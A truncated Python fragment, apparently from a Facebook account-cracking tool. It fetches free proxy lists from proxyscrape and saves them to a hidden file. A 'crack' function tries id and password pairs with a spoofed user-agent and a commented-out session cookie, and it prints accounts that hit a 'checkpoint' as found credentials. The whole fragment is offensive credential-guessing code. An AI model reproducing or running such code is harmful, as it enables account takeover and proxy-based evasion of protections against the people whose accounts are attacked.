...
try:
	...
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text	open('.prox.txt','w').write(prox) 
...
def crack(idf,pwv):
    ...
    # 'cookie': 'sb=6FjyYy-t_sOj-XjkHjYsBTfU; datr=_VjyYybvmxdz_bCcvcFtFbm5; dpr=1.5; m_pixel_ratio=1.5; wd=1280x609; fr=0EeDfWdOZXo3ZalNi..Bj8ljo.xb.AAA.0.0.Bj8lmy.AWUxd-OWAIw',
    ...
    'user-agent':ua }
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r \033[93;1m YM-CP\033[93;1m----[    \x1b[1;91m{idf} | {pw}{N}')     
